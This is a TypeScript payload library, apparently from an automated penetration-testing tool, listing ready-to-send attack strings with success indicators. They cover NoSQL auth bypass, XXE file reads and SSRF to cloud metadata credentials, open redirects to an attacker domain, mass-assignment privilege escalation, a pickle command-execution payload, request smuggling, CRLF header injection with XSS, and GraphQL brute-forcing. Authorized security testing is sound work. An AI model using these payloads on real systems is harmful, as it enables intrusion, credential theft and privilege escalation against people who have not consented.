/**
 * Advanced payload library — 8 new categories for OdinForge AEV v2.0
 * NoSQL injection, XXE, open redirect, mass assignment, deserialization,
 * HTTP request smuggling, CRLF injection, GraphQL injection
 */

import type { Payload, PayloadSet } from "./payload-types";

// ============================================================================
// NoSQL INJECTION PAYLOADS
// ============================================================================

export const nosqlInjectionPayloads: PayloadSet = {
  category: "nosql_injection",
  name: "NoSQL Injection",
  description: "MongoDB, Redis, and CouchDB operator injection payloads for auth bypass and data exfiltration",
  payloads: [
    {
      id: "nosql-ne-operator",
      category: "nosql_injection",
      technique: "operator_injection",
      riskLevel: "high",
      value: '{"$ne": null}',
      description: "MongoDB $ne operator — matches any non-null value",
      expectedBehavior: "Auth bypass if server accepts JSON operators in credential fields",
      successIndicators: ["token", "session", "dashboard", "200"],
      failureIndicators: ["invalid", "error", "400", "401"],
      applicableContexts: ["body_param"],
    },
    {
      id: "nosql-gt-operator",
      category: "nosql_injection",
      technique: "operator_injection",
      riskLevel: "high",
      value: '{"$gt": ""}',
      description: "MongoDB $gt operator — matches any value greater than empty string",
      expectedBehavior: "Bypasses string comparison in login",
      successIndicators: ["token", "user", "logged"],
      failureIndicators: ["invalid", "error"],
      applicableContexts: ["body_param"],
    },
    {
      id: "nosql-regex-operator",
      category: "nosql_injection",
      technique: "operator_injection",
      riskLevel: "medium",
      value: '{"$regex": ".*"}',
      description: "MongoDB $regex operator — matches any string",
      expectedBehavior: "Bypasses string equality check",
      successIndicators: ["token", "user"],
      failureIndicators: ["invalid", "error"],
      applicableContexts: ["body_param"],
    },
    {
      id: "nosql-where-true",
      category: "nosql_injection",
      technique: "operator_injection",
      riskLevel: "high",
      value: '{"$where": "1==1"}',
      description: "MongoDB $where operator with always-true JavaScript expression",
      expectedBehavior: "Server-side JS execution, returns all matching documents",
      successIndicators: ["token", "user", "email"],
      failureIndicators: ["$where", "not allowed", "400"],
      applicableContexts: ["body_param"],
    },
    {
      id: "nosql-in-operator",
      category: "nosql_injection",
      technique: "operator_injection",
      riskLevel: "medium",
      value: '{"$in": ["admin", "administrator", "root", "superuser"]}',
      description: "MongoDB $in operator — matches any of the listed values",
      expectedBehavior: "Returns admin account if any common admin username exists",
      successIndicators: ["token", "admin", "role"],
      failureIndicators: ["error", "400"],
      applicableContexts: ["body_param"],
    },
    {
      id: "nosql-form-ne",
      category: "nosql_injection",
      technique: "operator_injection",
      riskLevel: "high",
      value: "[$ne]=1",
      description: "PHP-style NoSQL injection via query parameter array notation",
      expectedBehavior: "Auth bypass when server uses PHP/Express query parsing",
      successIndicators: ["token", "session"],
      failureIndicators: ["invalid", "error"],
      applicableContexts: ["url_param", "body_param"],
    },
  ],
};

// ============================================================================
// XXE INJECTION PAYLOADS
// ============================================================================

export const xxePayloads: PayloadSet = {
  category: "xxe",
  name: "XML External Entity (XXE) Injection",
  description: "XXE payloads for file disclosure, SSRF, and OOB data exfiltration",
  payloads: [
    {
      id: "xxe-file-passwd",
      category: "xxe",
      technique: "entity_injection",
      riskLevel: "high",
      value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>`,
      description: "Classic XXE — reads /etc/passwd via external entity",
      expectedBehavior: "Server returns /etc/passwd content in response body",
      successIndicators: ["root:", "/bin/bash", "daemon:", "/home"],
      failureIndicators: ["error parsing", "invalid xml", "entity not allowed"],
      applicableContexts: ["body_param"],
    },
    {
      id: "xxe-file-hostname",
      category: "xxe",
      technique: "entity_injection",
      riskLevel: "medium",
      value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><data>&xxe;</data></root>`,
      description: "XXE — reads /etc/hostname to confirm file disclosure",
      expectedBehavior: "Returns server hostname in response",
      successIndicators: [".local", ".internal", "server"],
      failureIndicators: ["entity not allowed", "parsing error"],
      applicableContexts: ["body_param"],
    },
    {
      id: "xxe-ssrf-imds",
      category: "xxe",
      technique: "entity_injection",
      riskLevel: "high",
      value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root><data>&xxe;</data></root>`,
      description: "XXE SSRF — reaches AWS EC2 IMDS to steal IAM credentials",
      expectedBehavior: "Returns IAM role credentials or EC2 metadata",
      successIndicators: ["AccessKeyId", "SecretAccessKey", "iam/", "ami-id"],
      failureIndicators: ["network error", "timeout", "entity not allowed"],
      applicableContexts: ["body_param"],
    },
    {
      id: "xxe-blind-oob",
      category: "xxe",
      technique: "out_of_band",
      riskLevel: "high",
      value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://oast.me/xxe">%remote;]><root/>`,
      description: "Blind XXE — triggers OOB HTTP request to detect XXE without in-band reflection",
      expectedBehavior: "Server makes outbound HTTP request to collaborator URL",
      successIndicators: ["200", "request received"],
      failureIndicators: ["entity not allowed", "DOCTYPE not allowed"],
      applicableContexts: ["body_param"],
    },
    {
      id: "xxe-error-based",
      category: "xxe",
      technique: "error_based",
      riskLevel: "medium",
      value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">%eval;%err;]><root/>`,
      description: "Error-based XXE — leaks file content via error messages",
      expectedBehavior: "Server error includes file content in path reference",
      successIndicators: ["/nonexistent/", "file not found"],
      failureIndicators: ["entity not allowed", "DOCTYPE not allowed"],
      applicableContexts: ["body_param"],
    },
  ],
};

// ============================================================================
// OPEN REDIRECT PAYLOADS
// ============================================================================

export const openRedirectPayloads: PayloadSet = {
  category: "open_redirect",
  name: "Open Redirect",
  description: "URL manipulation payloads to bypass redirect validation and steal tokens via open redirect",
  payloads: [
    {
      id: "redirect-evil-domain",
      category: "open_redirect",
      technique: "reflected",
      riskLevel: "medium",
      value: "https://evil.attacker.com",
      description: "Direct external redirect to attacker domain",
      expectedBehavior: "Server issues 301/302 to evil.attacker.com",
      successIndicators: ["Location: https://evil.attacker.com", "302", "301"],
      failureIndicators: ["blocked", "invalid", "whitelist"],
      applicableContexts: ["url_param"],
    },
    {
      id: "redirect-double-slash",
      category: "open_redirect",
      technique: "reflected",
      riskLevel: "medium",
      value: "//evil.attacker.com",
      description: "Protocol-relative redirect — bypasses http/https checks",
      expectedBehavior: "Server redirects to //evil.attacker.com (browser navigates to https://evil.attacker.com)",
      successIndicators: ["Location: //evil", "302"],
      failureIndicators: ["blocked", "invalid"],
      applicableContexts: ["url_param"],
    },
    {
      id: "redirect-backslash",
      category: "open_redirect",
      technique: "reflected",
      riskLevel: "medium",
      value: "https:\\/\\/evil.attacker.com",
      description: "Backslash bypass — some parsers normalize backslashes to forward slashes",
      expectedBehavior: "Bypass whitelist check via backslash normalization",
      successIndicators: ["Location:", "302"],
      failureIndicators: ["blocked"],
      applicableContexts: ["url_param"],
    },
    {
      id: "redirect-url-encoded",
      category: "open_redirect",
      technique: "reflected",
      riskLevel: "medium",
      value: "https%3A%2F%2Fevil.attacker.com",
      description: "URL-encoded redirect — bypasses naive string comparison",
      expectedBehavior: "Server decodes and redirects to evil domain",
      successIndicators: ["Location:", "302"],
      failureIndicators: ["blocked", "invalid"],
      applicableContexts: ["url_param"],
    },
    {
      id: "redirect-at-sign",
      category: "open_redirect",
      technique: "reflected",
      riskLevel: "medium",
      value: "https://legit.target.com@evil.attacker.com",
      description: "@-sign trick — browser navigates to evil.attacker.com with legit as username",
      expectedBehavior: "Parser splits on @ and redirects to evil.attacker.com",
      successIndicators: ["Location:", "302"],
      failureIndicators: ["blocked", "invalid"],
      applicableContexts: ["url_param"],
    },
  ],
};

// ============================================================================
// MASS ASSIGNMENT PAYLOADS
// ============================================================================

export const massAssignmentPayloads: PayloadSet = {
  category: "mass_assignment",
  name: "Mass Assignment / Parameter Pollution",
  description: "Privileged field injection to escalate user privileges via mass assignment vulnerabilities",
  payloads: [
    {
      id: "mass-isadmin-bool",
      category: "mass_assignment",
      technique: "parameter_pollution",
      riskLevel: "high",
      value: '{"isAdmin": true}',
      description: "Inject isAdmin=true to elevate privileges",
      expectedBehavior: "Server assigns admin role to updated user",
      successIndicators: ["isAdmin", "true", "admin"],
      failureIndicators: ["not allowed", "invalid field", "400"],
      applicableContexts: ["body_param"],
    },
    {
      id: "mass-role-admin",
      category: "mass_assignment",
      technique: "parameter_pollution",
      riskLevel: "high",
      value: '{"role": "admin"}',
      description: "Inject role=admin to elevate role",
      expectedBehavior: "Server accepts role field and stores admin role",
      successIndicators: ["role", "admin"],
      failureIndicators: ["not allowed", "invalid"],
      applicableContexts: ["body_param"],
    },
    {
      id: "mass-verified-true",
      category: "mass_assignment",
      technique: "parameter_pollution",
      riskLevel: "medium",
      value: '{"verified": true, "emailVerified": true}',
      description: "Bypass email verification by injecting verified=true",
      expectedBehavior: "Account verified without completing email verification flow",
      successIndicators: ["verified", "true"],
      failureIndicators: ["not allowed", "invalid"],
      applicableContexts: ["body_param"],
    },
    {
      id: "mass-balance-inject",
      category: "mass_assignment",
      technique: "parameter_pollution",
      riskLevel: "high",
      value: '{"balance": 9999, "credit": 9999}',
      description: "Inject artificial balance/credit to gain financial advantage",
      expectedBehavior: "Server stores injected balance value",
      successIndicators: ["balance", "9999", "credit"],
      failureIndicators: ["not allowed", "readonly"],
      applicableContexts: ["body_param"],
    },
    {
      id: "mass-permissions-inject",
      category: "mass_assignment",
      technique: "parameter_pollution",
      riskLevel: "high",
      value: '{"permissions": ["read", "write", "admin", "delete"], "is_superuser": true}',
      description: "Inject permissions array and superuser flag",
      expectedBehavior: "Server assigns elevated permissions to user",
      successIndicators: ["permissions", "admin", "superuser"],
      failureIndicators: ["not allowed", "400"],
      applicableContexts: ["body_param"],
    },
  ],
};

// ============================================================================
// DESERIALIZATION PAYLOADS
// ============================================================================

export const deserializationPayloads: PayloadSet = {
  category: "deserialization",
  name: "Insecure Deserialization",
  description: "Deserialization gadget payloads targeting Java, PHP, Python pickle, and Node.js",
  payloads: [
    {
      id: "deser-php-object",
      category: "deserialization",
      technique: "gadget_chain",
      riskLevel: "high",
      value: 'O:8:"stdClass":1:{s:4:"test";s:6:"attack";}',
      description: "PHP serialized object injection — triggers deserialization of attacker-controlled object",
      expectedBehavior: "Server deserializes PHP object; gadget chains may trigger RCE",
      successIndicators: ["stdClass", "deserialization error", "500"],
      failureIndicators: ["invalid", "not allowed"],
      applicableContexts: ["body_param", "cookie"],
    },
    {
      id: "deser-java-ysoserial-hint",
      category: "deserialization",
      technique: "gadget_chain",
      riskLevel: "high",
      value: "rO0AB",
      description: "Java serialized object magic bytes (base64 AC ED 00 05) — detects Java deserialization endpoint",
      expectedBehavior: "Server throws ClassNotFoundException or deserialization error — confirms Java deserialization in use",
      successIndicators: ["java.io", "ClassNotFoundException", "500"],
      failureIndicators: ["400", "invalid"],
      applicableContexts: ["body_param", "cookie"],
    },
    {
      id: "deser-node-prototype-pollution",
      category: "deserialization",
      technique: "gadget_chain",
      riskLevel: "high",
      value: '{"__proto__": {"isAdmin": true, "role": "admin"}}',
      description: "Node.js prototype pollution via JSON deserialization — pollutes Object.prototype",
      expectedBehavior: "All objects inherit isAdmin/role properties, bypassing authorization checks",
      successIndicators: ["isAdmin", "admin", "true"],
      failureIndicators: ["not allowed", "400"],
      applicableContexts: ["body_param"],
    },
    {
      id: "deser-python-pickle",
      category: "deserialization",
      technique: "gadget_chain",
      riskLevel: "high",
      value: "cos\nsystem\n(S'id'\ntR.",
      description: "Python pickle RCE payload — executes 'id' command via pickle deserialization",
      expectedBehavior: "Command output appears in response or error if server deserializes pickle data",
      successIndicators: ["uid=", "root", "500"],
      failureIndicators: ["invalid", "400"],
      applicableContexts: ["body_param"],
    },
  ],
};

// ============================================================================
// HTTP REQUEST SMUGGLING PAYLOADS
// ============================================================================

export const httpSmugglingPayloads: PayloadSet = {
  category: "http_request_smuggling",
  name: "HTTP Request Smuggling",
  description: "TE-CL and CL-TE desync payloads to poison backend request queues",
  payloads: [
    {
      id: "smuggle-te-cl",
      category: "http_request_smuggling",
      technique: "te_cl",
      riskLevel: "high",
      value: "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
      description: "TE-CL HTTP request smuggling — front-end uses Transfer-Encoding, back-end uses Content-Length",
      expectedBehavior: "Smuggled GPOST request poisons back-end queue, served to next victim request",
      successIndicators: ["Unrecognized method GPOST", "smuggle", "next request affected"],
      failureIndicators: ["400", "invalid"],
      applicableContexts: ["header"],
    },
    {
      id: "smuggle-cl-te",
      category: "http_request_smuggling",
      technique: "cl_te",
      riskLevel: "high",
      value: "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
      description: "CL-TE HTTP request smuggling — front-end uses Content-Length, back-end uses Transfer-Encoding",
      expectedBehavior: "Trailing 'G' poisons back-end queue, prepended to next victim's request",
      successIndicators: ["GPOST", "smuggle", "method"],
      failureIndicators: ["400", "invalid"],
      applicableContexts: ["header"],
    },
    {
      id: "smuggle-te-obfuscation",
      category: "http_request_smuggling",
      technique: "te_cl",
      riskLevel: "high",
      value: "Transfer-Encoding: xchunked",
      description: "TE obfuscation — obfuscated Transfer-Encoding value accepted by some servers",
      expectedBehavior: "Back-end processes as chunked while front-end ignores obfuscated header",
      successIndicators: ["desync", "timeout", "next request"],
      failureIndicators: ["400", "not supported"],
      applicableContexts: ["header"],
    },
  ],
};

// ============================================================================
// CRLF INJECTION PAYLOADS
// ============================================================================

export const crlfInjectionPayloads: PayloadSet = {
  category: "crlf_injection",
  name: "CRLF / Header Injection",
  description: "CRLF sequence injection to add arbitrary response headers, set cookies, and perform HTTP response splitting",
  payloads: [
    {
      id: "crlf-set-cookie",
      category: "crlf_injection",
      technique: "newline_injection",
      riskLevel: "medium",
      value: "%0d%0aSet-Cookie: session=evil; HttpOnly",
      description: "CRLF injection to set malicious cookie via header injection",
      expectedBehavior: "Server reflects injected CRLF and adds attacker-controlled Set-Cookie header",
      successIndicators: ["Set-Cookie: session=evil", "injected header"],
      failureIndicators: ["encoded", "sanitized", "400"],
      applicableContexts: ["url_param", "header"],
    },
    {
      id: "crlf-xss-via-header",
      category: "crlf_injection",
      technique: "newline_injection",
      riskLevel: "high",
      value: "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
      description: "HTTP response splitting — inject Content-Type header and XSS payload",
      expectedBehavior: "Browser executes injected script from server response",
      successIndicators: ["Content-Type: text/html", "script", "alert"],
      failureIndicators: ["sanitized", "400"],
      applicableContexts: ["url_param"],
    },
    {
      id: "crlf-cache-poisoning",
      category: "crlf_injection",
      technique: "newline_injection",
      riskLevel: "high",
      value: "%0d%0aX-Cache-Poison: true%0d%0aX-Forwarded-Host: evil.attacker.com",
      description: "CRLF injection for web cache poisoning — inject X-Forwarded-Host to redirect cached responses",
      expectedBehavior: "Cached response includes attacker-controlled host header, poisoning cache for all users",
      successIndicators: ["X-Forwarded-Host: evil", "cached"],
      failureIndicators: ["sanitized", "400"],
      applicableContexts: ["url_param", "header"],
    },
  ],
};

// ============================================================================
// GRAPHQL INJECTION PAYLOADS
// ============================================================================

export const graphqlInjectionPayloads: PayloadSet = {
  category: "graphql_injection",
  name: "GraphQL Injection",
  description: "GraphQL-specific attack payloads: introspection, field injection, batching, and query manipulation",
  payloads: [
    {
      id: "graphql-introspect-full",
      category: "graphql_injection",
      technique: "introspection",
      riskLevel: "low",
      value: '{"query": "{ __schema { types { name fields { name args { name type { name kind } } } } } }"}',
      description: "Full GraphQL introspection query — dumps entire schema",
      expectedBehavior: "Returns complete type/field/argument listing — exposes internal API structure",
      successIndicators: ["__schema", "types", "fields", "args"],
      failureIndicators: ["disabled", "not allowed", "403"],
      applicableContexts: ["body_param"],
    },
    {
      id: "graphql-field-injection",
      category: "graphql_injection",
      technique: "operator_injection",
      riskLevel: "high",
      value: '{"query": "{ user(id: 1) { id email password role adminNotes } }"}',
      description: "GraphQL field injection — request privileged fields not shown in UI",
      expectedBehavior: "Server returns hidden fields like password hash, role, admin notes",
      successIndicators: ["password", "role", "adminNotes", "hash"],
      failureIndicators: ["error", "not found", "403"],
      applicableContexts: ["body_param"],
    },
    {
      id: "graphql-batch-brute",
      category: "graphql_injection",
      technique: "batching",
      riskLevel: "high",
      value: '[{"query":"{ login(email:\\"a@a.com\\", password:\\"pass1\\") { token } }"},{"query":"{ login(email:\\"a@a.com\\", password:\\"pass2\\") { token } }"},{"query":"{ login(email:\\"a@a.com\\", password:\\"pass3\\") { token } }"}]',
      description: "GraphQL batch query brute-force — send many login attempts in a single HTTP request",
      expectedBehavior: "Rate limiting bypassed; multiple credential tests per request",
      successIndicators: ["token", "login"],
      failureIndicators: ["batching disabled", "rate limit", "403"],
      applicableContexts: ["body_param"],
    },
    {
      id: "graphql-alias-overload",
      category: "graphql_injection",
      technique: "batching",
      riskLevel: "medium",
      value: '{"query": "{ a1: user(id:1){id} a2: user(id:2){id} a3: user(id:3){id} a4: user(id:4){id} a5: user(id:5){id} }"}',
      description: "GraphQL alias overloading — use query aliases to enumerate many resources in one request",
      expectedBehavior: "Returns data for multiple users in single request — bypasses per-request rate limits",
      successIndicators: ["a1", "a2", "id"],
      failureIndicators: ["alias not allowed", "400"],
      applicableContexts: ["body_param"],
    },
  ],
};
